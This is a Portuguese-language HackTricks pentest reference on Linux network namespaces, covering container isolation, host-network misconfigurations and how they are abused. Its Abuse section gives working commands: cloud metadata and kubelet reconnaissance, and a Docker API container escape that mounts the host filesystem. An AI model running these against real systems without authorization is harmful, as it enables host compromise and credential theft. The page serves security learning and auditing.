# Namespace de Rede

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão Geral

O namespace de rede isola recursos relacionados à rede, como interfaces, endereços IP, tabelas de roteamento, estado ARP/neighbor, regras de firewall, sockets e o conteúdo de arquivos como `/proc/net`. Por isso um container pode ter o que parece ser seu próprio `eth0`, suas próprias rotas locais e seu próprio dispositivo loopback sem possuir a pilha de rede real do host.

Em termos de segurança, isso importa porque o isolamento de rede vai muito além do binding de portas. Um namespace de rede privado limita o que a workload pode observar ou reconfigurar diretamente. Uma vez que esse namespace é compartilhado com o host, o container pode, de repente, ganhar visibilidade sobre listeners do host, serviços locais do host e pontos de controle de rede que nunca deveriam ser expostos à aplicação.

## Operação

Um namespace de rede recém-criado começa com um ambiente de rede vazio ou quase vazio até que interfaces sejam anexadas a ele. Runtimes de container então criam ou conectam interfaces virtuais, atribuem endereços e configuram rotas para que a workload tenha a conectividade esperada. Em implantações baseadas em bridge, isso geralmente significa que o container vê uma interface suportada por veth conectada a uma bridge do host. Em Kubernetes, plugins CNI cuidam da configuração equivalente para a rede do Pod.

Essa arquitetura explica por que `--network=host` ou `hostNetwork: true` é uma mudança tão dramática. Em vez de receber uma pilha de rede privada preparada, a workload passa a usar a pilha real do host.

## Laboratório

Você pode ver um namespace de rede quase vazio com:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E você pode comparar containers normais e containers com rede do host com:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
O container com rede do host deixa de ter sua própria visão isolada de sockets e interfaces. Essa mudança por si só já é significativa antes mesmo de você perguntar que capacidades o processo possui.

## Uso em tempo de execução

Docker e Podman normalmente criam um namespace de rede privado para cada container, a menos que configurados de outra forma. Kubernetes geralmente dá a cada Pod seu próprio namespace de rede, compartilhado pelos containers dentro desse Pod, mas separado do host. Incus/LXC também fornecem isolamento rico baseado em namespace de rede, frequentemente com uma variedade maior de configurações de rede virtual.

O princípio comum é que a rede privada é a fronteira de isolamento padrão, enquanto a rede do host é uma opção explícita para sair dessa fronteira.

## Misconfigurações

A misconfiguração mais importante é simplesmente compartilhar o namespace de rede do host. Isso às vezes é feito por desempenho, monitoramento em baixo nível ou conveniência, mas remove uma das fronteiras mais limpas disponíveis para containers. Listeners locais do host ficam alcançáveis de forma mais direta, serviços restritos ao localhost podem se tornar acessíveis, e capacidades como `CAP_NET_ADMIN` ou `CAP_NET_RAW` se tornam muito mais perigosas porque as operações que elas permitem agora são aplicadas ao próprio ambiente de rede do host.

Outro problema é conceder em excesso capacidades relacionadas à rede mesmo quando o namespace de rede é privado. Um namespace privado ajuda, mas não torna os raw sockets ou o controle avançado da rede inofensivos.

## Abuso

Em ambientes fracamente isolados, atacantes podem inspecionar serviços que escutam no host, alcançar endpoints de gerenciamento vinculados apenas ao loopback, sniff ou interferir no tráfego dependendo das capacidades exatas e do ambiente, ou reconfigurar rotas e estado de firewall se `CAP_NET_ADMIN` estiver presente. Em um cluster, isso também pode facilitar lateral movement e control-plane reconnaissance.

Se você suspeita de uso da rede do host, comece confirmando que as interfaces e listeners visíveis pertencem ao host em vez de a uma rede isolada de container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Serviços acessíveis apenas via loopback costumam ser a primeira descoberta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se capacidades de rede estiverem presentes, teste se a carga de trabalho pode inspecionar ou alterar a pilha visível:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Em ambientes de cluster ou cloud, host networking também justifica uma rápida recon local de metadata e de serviços adjacentes ao control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemplo completo: Rede do host + runtime local / acesso ao Kubelet

A rede do host não fornece automaticamente root do host, mas frequentemente expõe serviços que são intencionalmente acessíveis apenas a partir do próprio nó. Se um desses serviços estiver mal protegido, a rede do host torna-se um caminho direto de elevação de privilégios.

Docker API em localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet em localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- comprometimento direto do host se uma API de runtime local estiver exposta sem proteção adequada
- reconhecimento do cluster ou movimento lateral se kubelet ou agentes locais estiverem acessíveis
- manipulação de tráfego ou negação de serviço quando combinado com `CAP_NET_ADMIN`

## Verificações

O objetivo dessas verificações é descobrir se o processo tem uma pilha de rede privada, quais rotas e listeners estão visíveis, e se a visão de rede já se assemelha à do host antes mesmo de você testar capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
O que é relevante aqui:

- Se o identificador do namespace ou o conjunto de interfaces visíveis parecer com os do host, host networking pode já estar em uso.
- `ss -lntup` é especialmente valioso porque revela listeners apenas no loopback e endpoints de gerenciamento locais.
- Rotas, nomes de interface e o contexto do firewall tornam-se muito mais importantes se `CAP_NET_ADMIN` ou `CAP_NET_RAW` estiverem presentes.

Ao revisar um container, sempre avalie o namespace de rede juntamente com o conjunto de capacidades. Host networking combinado com capacidades de rede elevadas representa uma postura muito diferente de bridge networking combinado com um conjunto padrão de capacidades mais restrito.
